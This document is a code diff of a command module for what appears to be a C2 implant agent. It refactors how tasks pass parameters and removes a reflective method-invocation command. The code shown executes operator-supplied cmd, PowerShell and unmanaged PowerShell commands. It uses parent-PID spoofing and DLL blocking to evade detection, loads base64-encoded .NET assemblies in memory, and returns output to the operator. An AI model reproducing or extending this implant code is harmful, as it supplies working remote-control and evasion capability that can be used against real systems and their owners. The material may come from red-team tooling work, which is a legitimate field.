@@ -69,25 +69,19 @@ namespace Agent.Modules
                     {
                         Name = "ImportAssembly",
                         Delegate = ImportAssembly
-                    },
-                    new ModuleInfo.Command
-                    {
-                        Name = "AssemblyMethod",
-                        Delegate = ExecuteAssemblyMethod
                     }
                 }
             };
         }
 
-        void ExecuteShellCommand(string AgentID, C2Data C2Data)
+        void ExecuteShellCommand(string AgentID, AgentTask Task)
         {
             try
             {
                 var ppid = Config.Get<int>(AgentConfig.PPID);
                 var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);
 
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<AgentTask>(C2Data.Data).Parameters;
-                var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
+                var arguments = (string)Task.Parameters["Arguments"];
 
                 var lamb = new SacrificialLamb(ppid, blockdlls);
                 var result = lamb.Shell("klasdjflasdkjflsadjflsadjflskdajflsjdfljdslfjsdlafjlsjdflsjadflsjdlfkj", $"/c {arguments}");
@@ -100,17 +94,15 @@ namespace Agent.Modules
             }
         }
 
-        void ExecuteRunCommand(string AgentID, C2Data C2Data)
+        void ExecuteRunCommand(string AgentID, AgentTask Task)
         {
             try
             {
                 var ppid = Config.Get<int>(AgentConfig.PPID);
                 var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);
 
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-
-                var command = (string)parameters.FirstOrDefault(p => p.Name.Equals("Command", StringComparison.OrdinalIgnoreCase)).Value;
-                var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
+                var command = (string)Task.Parameters["Command"];
+                var arguments = Task.Parameters["Arguments"];
 
                 if (arguments == null)
                 {
@@ -128,15 +120,14 @@ namespace Agent.Modules
             }
         }
 
-        void ExecutePowerShellCommand(string AgentID, C2Data C2Data)
+        void ExecutePowerShellCommand(string AgentID, AgentTask Task)
         {
             try
             {
                 var ppid = Config.Get<int>(AgentConfig.PPID);
                 var blockdlls = Config.Get<bool>(AgentConfig.BlockDLLs);
 
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
+                var arguments = (string)Task.Parameters["Arguments"];
 
                 var lamb = new SacrificialLamb(ppid, blockdlls);
                 var result = lamb.PowerShell("klasdjflasdkjflsadjflsadjflskdajflsjdfljdslfjsdlafjlsjdflsjadflsjdlfkj", $"-c \"{arguments}\"");
@@ -149,12 +140,11 @@ namespace Agent.Modules
             }
         }
 
-        void ExecutePowerPickCommand(string AgentID, C2Data C2Data)
+        void ExecutePowerPickCommand(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var arguments = (string)parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
+                var arguments = (string)Task.Parameters["Arguments"];
 
                 using (var runner = new PowerShellRunner())
                 {
@@ -173,17 +163,15 @@ namespace Agent.Modules
             }
         }
 
-        void ExecuteAssembly(string AgentID, C2Data C2Data)
+        void ExecuteAssembly(string AgentID, AgentTask Task)
         {
             var stdout = Console.Out;
             var stderr = Console.Error;
 
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-
-                var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
-                var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);
+                var arguments = Task.Parameters["Arguments"];
+                var asmBytes = Convert.FromBase64String((string)Task.Parameters["Assembly"]);
 
                 var outWrite = new StringWriter();
                 var errWrite = new StringWriter();
@@ -224,12 +212,11 @@ namespace Agent.Modules
             }
         }
 
-        void ImportAssembly(string AgentID, C2Data C2Data)
+        void ImportAssembly(string AgentID, AgentTask Task)
         {
             try
             {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-                var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);
+                var asmBytes = Convert.FromBase64String((string)Task.Parameters["Assembly"]);
 
                 CurrentAssembly = Assembly.Load(asmBytes);
 
@@ -242,57 +229,11 @@ namespace Agent.Modules
             
         }
 
-        void ImportPowerShell(string AgentID, C2Data C2Data)
+        void ImportPowerShell(string AgentID, AgentTask Task)
         {
-            var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-            CurrentPowerShell = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Script", StringComparison.OrdinalIgnoreCase)).Value);
+            CurrentPowerShell = Convert.FromBase64String((string)Task.Parameters["Script"]);
 
             Agent.SendMessage($"Imported {CurrentPowerShell.Length} bytes.");
-        }
-
-        void ExecuteAssemblyMethod(string AgentID, C2Data C2Data)
-        {
-            try
-            {
-                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data).Parameters;
-
-                var type = (string)parameters.FirstOrDefault(p => p.Name.Equals("Type", StringComparison.OrdinalIgnoreCase)).Value;
-                var method = (string)parameters.FirstOrDefault(p => p.Name.Equals("Method", StringComparison.OrdinalIgnoreCase)).Value;
-                var arguments = parameters.FirstOrDefault(p => p.Name.Equals("Arguments", StringComparison.OrdinalIgnoreCase)).Value;
-
-                var t = CurrentAssembly.GetType(type);
-
-                if (t == null)
-                {
-                    Agent.SendError("Could not find specified type");
-                    return;
-                }
-
-                var m = t.GetMethod(method);
-
-                if (m == null)
-                {
-                    Agent.SendError("Could not find specified method");
-                    return;
-                }
-
-                string result;
-
-                if (arguments == null)
-                {
-                    result = (string)m.Invoke(null, new object[] { });
-                }
-                else
-                {
-                    result = (string)m.Invoke(null, new object[] { (string)arguments });
-                }
-
-                Agent.SendMessage(result.ToString());
-            }
-            catch (Exception e)
-            {
-                Agent.SendError(e.Message);
-            }
         }
     }
 }
